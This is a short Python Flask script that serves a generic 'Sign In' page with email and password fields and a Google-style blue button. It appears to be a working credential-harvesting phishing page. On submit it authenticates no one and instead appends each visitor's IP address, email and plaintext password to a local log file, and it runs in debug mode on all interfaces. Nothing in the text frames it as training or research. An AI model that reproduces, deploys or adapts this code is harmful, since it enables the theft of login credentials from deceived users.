from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.remote_addr
        with open('log.txt', 'a') as file:
            file.write(f"IP Address: {ip}\n")
            file.write(f"Email: {email}\n")
            file.write(f"Password: {password}\n")
    
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign In</title>
        <style>
            body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f5f5f5; }
            .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
            h1 { color: #333; }
            input[type="email"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
            button { width: 100%; padding: 10px; background-color: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; }
            button:hover { background-color: #357ae8; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Sign In</h1>
            <form method="POST">
                <input type="email" name="email" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign In</button>
            </form>
        </div>
    </body>
    </html>
    """
    return render_template_string(html)

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)